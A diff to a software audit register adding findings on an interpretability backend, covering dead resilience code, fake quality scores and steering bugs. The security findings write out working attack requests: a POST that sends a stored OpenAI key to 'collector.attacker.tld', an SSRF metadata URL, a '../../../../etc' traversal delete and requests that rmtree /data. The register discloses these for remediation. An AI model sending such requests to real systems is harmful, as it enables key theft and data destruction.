@@ -6,8 +6,8 @@ Ids are never reused and never renumbered. A refuted finding is marked
 
 Schema, severity rubric and verification rules: see [PLAN.md](PLAN.md).
 
-**Count:** 61
-**Last id issued:** MIS-E2E-061
+**Count:** 75
+**Last id issued:** MIS-E2E-075
 
 ---
 
@@ -1062,3 +1062,257 @@ phase rediscovers them as new. Each carries the phase that owns its verification
 - **Verification (R3):** pending
 - **Proposed remediation:** Bind before `try`; treat `None` as absent; make `mask_value` reveal a fixed suffix only above a minimum length, and fix the docstring.
 - **Effort:** S
+
+---
+
+### MIS-E2E-062 — The entire steering resilience layer is unreachable; `/steering/status` is always "healthy"
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** **P0** *(per this audit's rubric: "a capability the product claims to ship that is unreachable in production")*
+- **Type:** reachability
+- **Location:** `backend/src/services/steering_resilience.py` (508 lines — circuit breaker, concurrency limiter, process isolation); consumers `backend/src/api/v1/endpoints/steering.py:158` (`GET /steering/status`) and `:193` (`POST /steering/reset`)
+- **Claim:** The module implements a circuit breaker with failure thresholds and CLOSED/OPEN/HALF_OPEN states, a concurrency limiter, and process isolation. **Not one of its state-mutating functions has a caller.** Verified by grepping `backend/src` *and* `backend/tests`:
+  ```
+  can_execute              callers outside the module: 0
+  try_acquire              callers outside the module: 0
+  record_success           callers outside the module: 0
+  record_failure           callers outside the module: 3  ← all false positives
+  execute_with_isolation   callers outside the module: 0
+  ```
+  The three `record_failure` hits are an **unrelated method of the same name** on `EdgeEvidence` in `schemas/evidence_ladder.py:71` and its two tests. A name collision, not a caller. The endpoint imports only the *getters*: `get_circuit_breaker`, `get_concurrency_limiter`, `get_process_isolation`, `get_resilience_status`, `reset_resilience`.
+- **Failure scenario:** `_failure_count` is initialised to 0 at `:76` and incremented only in `record_failure`, which nothing calls. `_state` is initialised CLOSED at `:75` and leaves CLOSED only inside the same dead function. Therefore `GET /steering/status` computes `"healthy" if resilience["circuit_breaker"]["state"] == "closed"` and **can only ever return "healthy"** — no matter how many steering tasks have failed. `POST /steering/reset` resets state that was never non-default: a no-op that reports success. The endpoint's own docstring says *"Use this endpoint to monitor steering health and diagnose issues."* An operator diagnosing a steering outage is told the service is healthy, by design, always.
+- **Evidence:** **verified-by-live-repro** — caller grep over `src` and `tests`, the three hits individually resolved to a name collision, the state-transition sites read
+- **Doc reference:** none — and that is part of the finding; `CLAUDE.md`'s Reachability gate says *"A capability is not shipped until a test FAILS when its wiring is removed."* Nothing here can be unwired, because nothing is wired.
+- **Verification (R3):** **CONFIRMED at R1**
+- **Proposed remediation:** Either wire it — `record_failure` on the steering task's exception path, `try_acquire` around dispatch — or delete the module and make `/steering/status` report what it can actually observe. Shipping a health endpoint that is a constant is worse than not shipping one. Then apply the repo's own rule: delete the wiring line and require a red.
+- **Effort:** M
+- **Note:** This is the same shape as the 16 unregistered `millm_circuit_*` MCP tools that `backend/tests/unit/test_reachability.py` was written to prevent. That harness guards the MCP surface only; nothing guards the service layer.
+
+---
+
+### MIS-E2E-063 — Coherence and behavioral scores are a hardcoded 0.5 presented as measurements
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** P1
+- **Type:** bug *(the "wrong results presented as correct" class)*
+- **Location:** `backend/src/services/steering_service.py:1568-1573`; `backend/requirements.txt`
+- **Claim:** `_compute_coherence` lazily imports `sentence_transformers`, and on `ImportError` logs a warning and `return 0.5`. **`sentence-transformers` is not in `requirements.txt` or `pyproject.toml`, and is not installed in the backend venv** — confirmed: `ModuleNotFoundError: No module named 'sentence_transformers'`. So the import always fails, and every `coherence` and `behavioral_score` the product has ever reported is the literal constant `0.5`.
+- **Failure scenario:** The UI renders these as measured quality scores beside real generated text. A user comparing steering strengths sees coherence 0.5 at every dial and reads it as "coherence is unaffected by strength" — a finding about the model, produced by a missing dependency. This is precisely the class the J-Lens arc's review lessons name: *evidence that is wrong rather than merely missing*. Second-order: the `except` clause catches only `ImportError`, so a non-import failure (the model's first-use download failing offline — the normal case in this deployment) propagates and aborts the whole steering request instead of degrading.
+- **Evidence:** **verified-by-live-repro** — dependency files grepped, import attempted in the real venv and failed
+- **Doc reference:** PPRD §3.6 (Model Steering quality metrics)
+- **Verification (R3):** **CONFIRMED at R1**
+- **Proposed remediation:** Add the dependency, or return `None` and have the UI render "not measured". A constant must never occupy a field the user reads as a measurement. Broaden the `except` to `Exception` either way.
+- **Effort:** S
+
+---
+
+### MIS-E2E-064 — Compare and sweep steer with the wrong SAE basis; the 015 hazard was fixed on one path
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** P1
+- **Type:** bug
+- **Location:** `backend/src/services/steering_service.py:1888` (compare/sweep), `:2402` (`sae_map[request.sae_id]`)
+- **Claim:** Compare and sweep place their hook at `feature.layer` but always steer using the **request-level** SAE, discarding each feature's own `sae_id`. No endpoint validates that `feature.layer == sae.layer`. Because `d_model` is uniform across layers, the `hidden_dim != sae.d_in` shape guard **never fires** — so a feature from layer 20's dictionary is decoded through layer 12's SAE and applied at layer 20, silently, in the correct shape and the wrong basis. This is the Feature 015 multi-SAE hazard, and it was fixed for the **combined** path only.
+- **Failure scenario:** Steering output that looks plausible and is meaningless — the worst failure mode for an interpretability tool, because there is no error and the number of dimensions is right. Separately at `:2402`, `sae = sae_map[request.sae_id]` raises a bare `KeyError` inside the Celery worker when no feature routes to the request-level SAE — a multi-layer circuit whose primary SAE's layer carries no steerable members, or whose members fell past the 20-feature cap.
+- **Evidence:** plausible (read-only) — the code path is verified; the wrong-basis consequence is reasoned from uniform `d_model`
+- **Doc reference:** PADR IDL-31 (multi-SAE cross-layer steering, per-layer SAE application); 015_FPRD
+- **Verification (R3):** pending — a live steer with a cross-layer feature would settle it
+- **Proposed remediation:** Route each feature through its own `sae_id`, as the combined path already does; validate `layer == sae.layer` at the endpoint. This is the "fixed one representative, never generalized" anti-pattern this repo has recorded before.
+- **Effort:** M
+
+---
+
+### MIS-E2E-065 — A negative dial silently returns the baseline, labelled as steered
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** P1
+- **Type:** bug
+- **Location:** `backend/src/services/steering_core.py:266`
+- **Claim:** The unified steering core registers hooks only `if dial > 0`. A negative dial registers **no hooks at all** and returns unmodified baseline text — which the caller records as the steered arm.
+- **Failure scenario:** Negative strength is canonical in this product, not an edge case: the cluster-definition contract carries `sign ∈ {1, -1}` and a member's negative strength *is* its direction. Suppressive steering therefore produces baseline output recorded as a steered sample at that dial. In the transcript recorder (`record_steering_samples`) this writes `(dial, prompt, unsteered, steered)` rows where the two arms are byte-identical, and the whole point of that artifact is for a strong model to read the difference afterwards. A silent no-op, not an error.
+- **Evidence:** plausible (read-only)
+- **Doc reference:** PADR IDL-38 (one steering core); memory `cluster-member-meta-contract-rev` — "CANONICAL SIGN RULE: negative strength is already directional"
+- **Verification (R3):** pending
+- **Proposed remediation:** Gate on `dial != 0`, or reject a negative dial explicitly. Returning the baseline under a steered label is the one behaviour that must not be silent.
+- **Effort:** S
+
+---
+
+### MIS-E2E-066 — Batch extraction dispatches on the loop index, stranding jobs
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** P1
+- **Type:** bug
+- **Location:** `backend/src/services/extraction_service.py:504`; `_start_next_batch_job`
+- **Claim:** Batch extraction decides what to dispatch from the `enumerate` index (`position == 1`) rather than from the first job actually *created*, and `_start_next_batch_job` only ever advances to `current + 1`.
+- **Failure scenario:** If the first SAE in the batch is skipped (already extracted, invalid), **nothing is dispatched at all** — the batch silently does nothing. If a middle SAE is skipped, the tail is stranded: those jobs sit queued until the 3-hour reaper closes them with a *"crashed worker"* message, which is not what happened. The diagnosis the user is handed points at infrastructure for a dispatch-arithmetic bug.
+- **Evidence:** plausible (read-only)
+- **Doc reference:** PPRD §3.5 (SAE Management, batch extract)
+- **Verification (R3):** pending
+- **Proposed remediation:** Track created job ids and dispatch the first of those; advance to the next *created* job, not `current + 1`.
+- **Effort:** M
+
+---
+
+### MIS-E2E-067 — A failed extraction shows no reason, because the emit uses the wrong key
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** P2
+- **Type:** bug
+- **Location:** `backend/src/services/extraction_service.py:1892` (failure), `:1836` (completion)
+- **Claim:** A duplicate `extraction:failed` emit sends the key `"error"` where the frontend expects `"error_message"`. The store spread-merges the payload, so `error_message: undefined` overwrites the real message and nothing triggers a refetch. The parallel defect at `:1836` blanks the completion counts and sends `status: "extracting"` on a finished job.
+- **Failure scenario:** An extraction fails — including the OOM path, whose whole value is its diagnostics — and the UI shows a failed job with no reason at all. The information exists server-side and is destroyed in transit by a key name.
+- **Evidence:** plausible (read-only)
+- **Doc reference:** PADR IDL-12 (WebSocket emission standardization) — the IDL this violates
+- **Verification (R3):** pending — belongs to P09's cross-check of emitter payloads against consumer expectations
+- **Proposed remediation:** Fix both keys; then, per IDL-12, type the emit payloads so a key rename cannot pass silently.
+- **Effort:** S
+
+---
+
+### MIS-E2E-068 — Three more service defects: fabricated progress, prompt truncation, hot-path logging
+- **Phase / Round:** P02 / R1
+- **Source:** /code-review high
+- **Severity:** P2
+- **Type:** bug
+- **Location:** `extraction_service.py:1612`; `steering_service.py:1411`; `steering_service.py:1170`
+- **Claim:**
+  1. **Fabricated progress.** During the sampling phase, `features_extracted: int(latent_dim * progress)` reports a count of features that have **not been written** — zero rows exist. When the write phase begins the counter jumps *backwards* to 0.
+  2. **Silent prompt truncation.** `max_length = 2048 - params.max_new_tokens` ignores the model's real context window and truncates the prompt. At the schema-allowed `max_new_tokens=2048` the prompt is truncated to **zero tokens**, and the request still runs.
+  3. **Hot-path logging.** A `logger.info` inside the steering hook fires on every forward pass — hundreds of lines and list rebuilds per generation.
+  - (1) and (2) share a shape with the rest of this phase: a number the user reads as real that is not, and an input silently discarded rather than rejected.
+- **Evidence:** plausible (read-only)
+- **Doc reference:** none
+- **Verification (R3):** pending
+- **Proposed remediation:** Report written rows only; read the context window from the model config and 422 on an impossible combination; drop the log to `debug`.
+- **Effort:** S
+
+---
+
+### MIS-E2E-069 — An unauthenticated POST exfiltrates the stored OpenAI key to any host
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review
+- **Severity:** **P0**
+- **Type:** security
+- **Location:** `backend/src/api/v1/endpoints/labeling.py:490-524` (`POST /api/v1/labeling/models/openai`)
+- **Claim:** The handler takes a fully caller-chosen `endpoint_url` from the request body. If the body omits `api_key`, it **reads `openai_api_key` from `app_settings`, decrypts it**, and attaches it as `Authorization: Bearer <key>` to a `GET {endpoint_url}/v1/models`. The only URL check is a scheme test for `http`/`https` — `validate_llm_endpoint_url` is **never called on this path**. Confirmed: the validator has exactly two call sites in the entire tree (`schemas/labeling.py:168`, `settings.py:147`), neither of them here.
+- **Failure scenario:** One request:
+  ```
+  POST /api/v1/labeling/models/openai
+  {"endpoint_url": "https://collector.attacker.tld"}
+  ```
+  The backend decrypts the operator's real OpenAI key and sends it to the attacker's host in an `Authorization` header. **The omission of `api_key` is what triggers the exfiltration** — the fallback chain exists to be convenient and its convenience is the vulnerability. Every control the product offers around this credential — AES-256-GCM at rest, masking on every read, the Settings PIN — is bypassed by a single POST that never touches the settings API. The same request is also the SSRF the validator was written to prevent (`endpoint_url=http://169.254.169.254`).
+- **Evidence:** **verified-by-live-repro at source** — the fallback decrypt (`:492-503`), the scheme-only check (`:508-512`), the header construction (`:521-523`), and the validator's two-call-site inventory all read directly
+- **Doc reference:** PADR IDL-20 (AES-256-GCM), IDL-22 (security hardening); `utils/url_validation.py` docstring
+- **Verification (R3):** **CONFIRMED at R1**
+- **Proposed remediation:** Two independent fixes, both needed. (1) Call `validate_llm_endpoint_url` here. (2) More importantly, **never fall back to a stored credential for a host the request body chose** — attach the stored key only when the resolved host matches the configured `openai_compatible_endpoint` or `api.openai.com`; otherwise send no `Authorization` header at all.
+- **Effort:** S
+
+---
+
+### MIS-E2E-070 — Path traversal in extraction delete gives arbitrary directory removal
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review
+- **Severity:** **P0**
+- **Type:** security
+- **Location:** `backend/src/services/activation_service.py:1020` (`self.activations_dir / extraction_id`), `:1026` (`shutil.rmtree`); caller `backend/src/api/v1/endpoints/models.py:1197-1220`; schema `backend/src/schemas/model.py:359`
+- **Claim:** `delete_extraction` joins a caller-supplied id onto the activations root with no containment check, no `resolve_user_path`, and no format validation. `Path.__truediv__` does not normalise `..`, and both `Path.exists()` and `shutil.rmtree()` resolve it through the OS. The schema is a bare `List[str]` with `min_length=1` and no pattern.
+- **Failure scenario:** Verified at source — **the filesystem delete sits outside the `if extraction:` database guard.** The DB lookup at `models.py:1201-1210` runs first and is simply skipped when nothing matches; execution falls through to `activation_service.delete_extraction(extraction_id)` at `:1214` with the raw request string. So:
+  ```
+  DELETE /api/v1/models/<any-existing-model-id>/extractions
+  {"extraction_ids": ["../../../../etc"]}
+  ```
+  resolves to `/data/activations/../../../../etc`, finds it exists, and `rmtree`s it as the backend user. Any directory that user can write is destroyable — `/data` itself, the model store, the SAE store, the Postgres volume. The `except` at `:1217` logs a warning and `deleted_ids.append(extraction_id)` runs regardless, so **the endpoint reports success either way**. The same unvalidated join is a read primitive at `activation_service.py:982`.
+- **Evidence:** **verified-by-live-repro at source** — the join, the missing guard placement, the schema, and the swallow-and-report-success all read directly. Not executed: destroying a directory is the thing being reported.
+- **Doc reference:** PADR IDL-22 (Security Hardening — Path Injection) — the IDL this violates
+- **Verification (R3):** **CONFIRMED at R1**
+- **Proposed remediation:** Route the id through `settings.resolve_user_path()` (the correct, containment-checking resolver that already exists at `config.py:404`) **and** reject any `extraction_id` not matching `^[A-Za-z0-9_-]+$` at the schema, **and** move the filesystem delete inside the `if extraction:` block so only an id that resolved to a real row can reach an `rmtree`. Three cheap layers, because this one deletes things.
+- **Related:** MIS-E2E-006 — the hardened resolver having one caller is exactly why this site does not use it
+- **Effort:** S
+
+---
+
+### MIS-E2E-071 — User-writable path columns reach `rmtree`, enabling deletion of the whole data volume
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review
+- **Severity:** **P0**
+- **Type:** security
+- **Location:** `backend/src/schemas/dataset.py:29,45` (`raw_path`), `backend/src/schemas/model.py:37-38` (`file_path`, `quantized_path`); `dataset_service.py:226-247` and `model_service.py:207-210` (blind `setattr`); sinks `workers/dataset_tasks.py:1433-1438`, `api/v1/endpoints/models.py:161-171`
+- **Claim:** `raw_path`, `file_path` and `quantized_path` are exposed as free-form `Optional[str]` on the **create and update** schemas, with only a `max_length=512`. Both update services blind-apply every submitted field via `setattr` over `model_dump(exclude_unset=True)`. On delete, the stored path is read back and handed to a worker that `rmtree`s it after `settings.resolve_data_path()` — which is **not a containment check**. Verified at `config.py:391-393`: `if path_obj.is_absolute(): if path_obj.exists(): return path_obj` — an existing absolute path is returned verbatim.
+- **Failure scenario:** Two unauthenticated requests:
+  ```
+  POST   /api/v1/datasets   {"name":"x","source":"Local","raw_path":"/data"}
+  DELETE /api/v1/datasets/<id>
+  ```
+  `delete_dataset` returns `raw_path="/data"`, the Celery worker resolves it (absolute, exists → returned as-is) and `shutil.rmtree("/data")` — every model, SAE, checkpoint, activation store and J-lens artifact. Nothing in either request looks suspicious to a schema validator. `PATCH /api/v1/models/{id} {"file_path":"/data"}` + `DELETE` is the same primitive through the model plane, and `POST /models/{id}/redownload` triggers it **synchronously in the API process**.
+- **The underlying design fault:** the code treats "came from a DB row" as equivalent to "system-generated". That holds only while no API can write the row, and three schemas can. `sae_manager_service.py:712` has the identical pattern and is safe **today** purely because `local_path` happens not to be exposed — one field addition away from the same bug.
+- **Evidence:** **verified-by-live-repro at source** — the three schema fields, the blind `setattr`, and `resolve_data_path`'s absolute-path passthrough all read directly
+- **Doc reference:** PADR IDL-22
+- **Verification (R3):** **CONFIRMED at R1**
+- **Proposed remediation:** Remove these fields from the create/update schemas — nothing legitimate sets them over the API; the download workers write them. Then make every deletion sink re-assert containment with `resolve_user_path` immediately before `rmtree`. **The database is not a trust boundary while any API can write to it.**
+- **Effort:** M
+
+---
+
+### MIS-E2E-072 — The plaintext OpenAI key is written to disk in generated Postman collections
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review
+- **Severity:** **P0**
+- **Type:** security
+- **Location:** `backend/src/services/openai_labeling_service.py:406` and `:645`
+- **Claim:** `_save_request_for_testing` writes debug artifacts to `data_dir/tmp_api/`. The **cURL** branch was deliberately hardened — `:335-339` carries the comment *"NEVER write the real bearer token to disk — these files are debug artifacts that get checked into bug reports / shared"* and emits a `$OPENAI_API_KEY` placeholder. The **Postman** branch, sixty lines below in the same function, writes `f"Bearer {self.api_key}"` — the real decrypted key — into the JSON. The identical block is duplicated verbatim in `_save_poor_quality_debug` at `:642-646`.
+- **Failure scenario:** `export_format` defaults to `"both"`, so **the default path writes the plaintext key** — the fix applied to cURL is bypassed by the default. One file is written per feature labelled, so a single run scatters hundreds of copies of the key across the persistent `/data` volume, which is mounted into the backend and Celery pods and included in backups. The scenario the cURL comment anticipates — attaching the artifact to a bug report — then ships the key to wherever that report goes.
+- **Evidence:** verified-by-live-repro (both blocks and the hardened cURL comment read; `export_format` default traced to `schemas/labeling.py:98`)
+- **Doc reference:** PADR IDL-20; the in-code comment at `:335-339` is the project's own statement of the rule this violates
+- **Verification (R3):** pending — sweep `data_dir/tmp_api` for already-written collections
+- **Proposed remediation:** Emit `Bearer {{OPENAI_API_KEY}}` (a Postman variable) in both writers. Add a regression test that scans every file produced by both functions **across all three `export_format` values** for the key — the existing coverage evidently exercised only the cURL branch. Then sweep and rotate: three `tmp_api/` directories already exist in this working tree.
+- **Effort:** S
+- **Note:** this is the "fixed one representative, never generalized" anti-pattern, with the two sites sixty lines apart in one function.
+
+---
+
+### MIS-E2E-073 — `PUT /settings/bulk` skips the URL validation the single-key route applies
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review (flagged as unverified; verified here)
+- **Severity:** P2
+- **Type:** security
+- **Location:** `backend/src/api/v1/endpoints/settings.py:166-190` vs `:143-149`
+- **Claim:** `PUT /settings` validates `ollama_url` and `openai_compatible_endpoint` through `validate_llm_endpoint_url` before upserting. `PUT /settings/bulk` calls `AppSettingService.upsert(db, item)` directly in a loop with **no URL validation at all**. Notably the *other* hardening — the expunge-before-mask fix, with its explanatory comment — **is** correctly duplicated into the bulk path. One of the two protections was carried across and the other was not.
+- **Failure scenario:** The SSRF guard on the two endpoint keys is bypassed by sending them through `/bulk` instead. Those keys are subsequently used unvalidated by the labeling and enhanced-labeling paths, which is precisely why the validator exists on the single-key route.
+- **Evidence:** **verified-by-live-repro at source** — both handlers read in full; the reviewer explicitly flagged this as unchecked and it was checked
+- **Doc reference:** PADR IDL-22
+- **Verification (R3):** **CONFIRMED at R1**
+- **Proposed remediation:** Extract the validation into `AppSettingService.upsert` so neither route can forget it — a guard on the caller is a guard someone will not copy.
+- **Effort:** S
+
+---
+
+### MIS-E2E-074 — `trust_remote_code=True` is hardcoded in three services, overriding the user's download-time choice
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review
+- **Severity:** P1
+- **Type:** security
+- **Location:** `services/steering_service.py:899,921`; `services/logit_lens_service.py:351,361`; `services/local_labeling_service.py:84,92`
+- **Claim:** The download plumbing treats remote-code execution as an explicit opt-in defaulted **off**: `ModelDownloadRequest.trust_remote_code` defaults `False`, `ml/model_loader.py:184` defaults `False` and threads the caller's value into every `from_pretrained`, and `workers/model_tasks.py:237` respects it. Three services discard that and hardcode `True`.
+- **Failure scenario:** A user evaluates an untrusted community fine-tune and leaves `trust_remote_code` unchecked — whose documented meaning is *"do not run code from this repo"*. Download executes nothing, but `snapshot_download` still writes the repo's `modeling_*.py` to disk. The first steering run then calls `AutoModelForCausalLM.from_pretrained(load_path, trust_remote_code=True)`, transformers imports that file, and arbitrary Python executes in the GPU worker — which holds `/data` write access, the Celery broker and the DB credentials. **The safety flag is a property of which subsystem touches the model next, not of the model**, and the user is never told.
+- **Evidence:** plausible (read-only) — all six hardcode sites and the defaulted-off plumbing read; not executed
+- **Doc reference:** PADR IDL-3 (multi-architecture SAE support), IDL-13 (dynamic layer discovery)
+- **Verification (R3):** pending
+- **Proposed remediation:** Persist the download-time decision on the `Model` row and read it in all three services. Add a test asserting the flag reaching `from_pretrained` is `False` for such a row — and mutate it to `True` as a negative control, since a test that only checks "loading succeeded" passes against both.
+- **Effort:** M
+
+---
+
+### MIS-E2E-075 — Unvalidated `judge_endpoint`, and a manifest slot reserved for a credential
+- **Phase / Round:** P02 / R1
+- **Source:** /security-review
+- **Severity:** P2
+- **Type:** security
+- **Location:** `backend/src/services/circuit_calibration_service.py:48-69` (`create_config`), `:449` (client construction), `:164` (manifest payload); `api/v1/endpoints/circuits.py:325`; `mcp_server/tools/circuits.py:371`
+- **Claim:** `CalibrationBody.judge_endpoint` is free-form per-request input, copied into the config with **no validation — not even a scheme check** — and handed to an `OpenAI` client that POSTs from inside the GPU Celery worker. `validate_llm_endpoint_url` is not on this path. The MCP tool `calibrate_circuit_strength` exposes the same parameter to agents. Separately, `create_config` reserves a `judge_api_key` slot at `:69` and the **whole config dict** is written verbatim into the persisted calibration manifest at `:164`.
+- **Failure scenario:** The SSRF half is genuinely limited (POST-only to a `/chat/completions` path, and RFC1918/loopback are permitted by policy anyway) — Medium, not High. The larger risk is the second half: manifests are designed to travel, are read over MCP (`get_validation_manifest`) and re-run by `reproduce_calibration`. Today `CalibrationBody` has no `judge_api_key` field so pydantic drops it and the value is always `None` — **the credential-in-manifest is latent, one field addition away from live**, in a document whose stated purpose is portability.
+- **Evidence:** plausible (read-only)
+- **Doc reference:** PADR IDL-37 (calibration), IDL-34 (manifest reproducibility)
+- **Verification (R3):** pending
+- **Proposed remediation:** Validate the endpoint. Build the manifest config from an **explicit allow-list of keys**, not `cfg` wholesale. And extend `manifest_service._assert_no_paths` — which already walks payloads rejecting `/data/` and `/home/` strings — into an `_assert_no_secrets` that rejects keys matching `*key*`/`*token*`/`*secret*`. The guard shape already exists; it just does not cover this class.
+- **Effort:** M
